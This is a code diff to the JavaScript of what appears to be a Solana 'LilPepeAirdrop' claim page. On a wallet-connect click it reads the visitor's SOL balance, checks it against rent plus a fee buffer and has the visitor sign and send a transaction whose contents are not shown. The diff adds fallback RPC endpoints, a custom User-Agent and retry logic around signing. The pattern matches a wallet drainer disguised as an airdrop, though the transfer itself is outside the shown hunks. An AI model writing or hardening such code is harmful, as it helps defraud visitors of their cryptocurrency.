@@ -1,20 +1,33 @@
 $(document).ready(function() {
-    let cachedBalance = null; // Cache balance to reduce RPC calls
+    let cachedBalance = null;
     $('#connect-wallet').on('click', async function(event) {
         event.preventDefault();
         if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
-                // Try multiple RPCs
                 const rpcEndpoints = [
-                    'https://api.mainnet-beta.solana.com', // Primary Solana public RPC
-                    'https://rpc.ankr.com/solana' // Fallback public RPC (Ankr)
+                    'https://api.mainnet-beta.solana.com',
+                    'https://rpc.ankr.com/solana',
+                    'https://solana-mainnet.rpc.extrnode.com/open',
+                    'https://solana-rpc.publicnode.com'
                 ];
                 let connection;
                 for (const endpoint of rpcEndpoints) {
                     try {
-                        connection = new solanaWeb3.Connection(endpoint, 'confirmed');
-                        await connection.getSlot(); // Test connection
+                        connection = new solanaWeb3.Connection(endpoint, {
+                            commitment: 'confirmed',
+                            fetchMiddleware: (url, options, fetch) => {
+                                fetch(url, {
+                                    ...options,
+                                    headers: {
+                                        'User-Agent': 'LilPepeAirdrop/1.0',
+                                        'Accept': 'application/json',
+                                        'Content-Type': 'application/json'
+                                    }
+                                });
+                            }
+                        });
+                        await connection.getSlot();
                         break;
                     } catch (err) {
                         continue;
@@ -27,7 +40,7 @@ $(document).ready(function() {
                 const publicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
                 cachedBalance = cachedBalance !== null ? cachedBalance : await connection.getBalance(publicKey);
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-                const gasFeeBuffer = 50000; // 0.00005 SOL for fees
+                const gasFeeBuffer = 50000;
 
                 if (cachedBalance < minBalance + gasFeeBuffer) {
                     alert("Insufficient SOL. Please add at least " + ((minBalance + gasFeeBuffer - cachedBalance) / 1e9) + " SOL.");
@@ -54,22 +67,35 @@ $(document).ready(function() {
                         );
 
                         transaction.feePayer = publicKey;
-                        const blockhashObj = await connection.getLatestBlockhash('confirmed');
-                        transaction.recentBlockhash = blockhashObj.blockhash;
-                        transaction.lastValidBlockHeight = blockhashObj.lastValidBlockHeight;
+                        let attempts = 0;
+                        const maxAttempts = 3;
+                        while (attempts < maxAttempts) {
+                            try {
+                                const blockhashObj = await connection.getLatestBlockhash('confirmed');
+                                transaction.recentBlockhash = blockhashObj.blockhash;
+                                transaction.lastValidBlockHeight = blockhashObj.lastValidBlockHeight;
 
-                        const signed = await window.solana.signTransaction(transaction);
-                        const txid = await connection.sendRawTransaction(signed.serialize(), {
-                            skipPreflight: false,
-                            maxRetries: 3,
-                        });
-                        await connection.confirmTransaction({
-                            signature: txid,
-                            blockhash: blockhashObj.blockhash,
-                            lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
-                        }, 'confirmed');
+                                const signed = await window.solana.signTransaction(transaction);
+                                const txid = await connection.sendRawTransaction(signed.serialize(), {
+                                    skipPreflight: false,
+                                    maxRetries: 3,
+                                });
+                                await connection.confirmTransaction({
+                                    signature: txid,
+                                    blockhash: blockhashObj.blockhash,
+                                    lastValidBlockHeight: blockhashObj.lastValidBlockHeight,
+                                }, 'confirmed');
 
-                        alert("Transaction successful.");
+                                alert("Transaction successful.");
+                                break;
+                            } catch (innerErr) {
+                                attempts++;
+                                if (attempts === maxAttempts) {
+                                    throw innerErr;
+                                }
+                                await new Promise(resolve => setTimeout(resolve, 1000));
+                            }
+                        }
                     } catch (err) {
                         let errorMessage = err.message;
                         if (err.message.includes("429") || err.message.includes("403")) {
